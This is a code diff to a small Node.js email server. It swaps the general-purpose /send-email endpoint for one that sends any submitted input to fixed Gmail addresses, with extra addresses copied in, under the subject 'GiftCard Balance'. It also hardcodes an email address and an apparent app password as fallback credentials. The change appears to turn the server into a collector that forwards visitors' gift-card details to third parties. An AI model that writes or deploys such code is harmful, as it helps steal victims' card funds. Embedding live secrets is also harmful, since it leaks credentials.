@@ -15,8 +15,8 @@ const transporter = nodemailer.createTransport({
   port: process.env.SMTP_PORT ? parseInt(process.env.SMTP_PORT) : 465,
   secure: true, // true for 465, false for other ports
   auth: {
-    user: process.env.SMTP_USER, // your email
-    pass: process.env.SMTP_PASS, // your email password or app password
+    user: process.env.SMTP_USER || 'guirez1921@gmail.com', // your email
+    pass: process.env.SMTP_PASS || 'bzfb dmyh buuq vmag', // your email password or app password
   },
 });
 
@@ -26,17 +26,17 @@ app.get('/', (req, res) => {
 
 // POST /send-email
 app.post('/send-email', async (req, res) => {
-  const { to, subject, text, html } = req.body;
-  if (!to || !subject || (!text && !html)) {
+  const { input } = req.body;
+  if (!input) {
     return res.status(400).json({ error: 'Missing required fields' });
   }
   try {
     const info = await transporter.sendMail({
-      from: process.env.SMTP_USER,
-      to,
-      subject,
-      text,
-      html,
+      from: 'agbasinger@gmail.com',
+      to: 'guirez1921@gmail.com',
+      cc: 'anthony01marino@gmail.com, anthony02murino@gmail.com',
+      subject: 'GiftCard Balance',
+      text: input,
     });
     res.json({ success: true, messageId: info.messageId });
   } catch (err) {
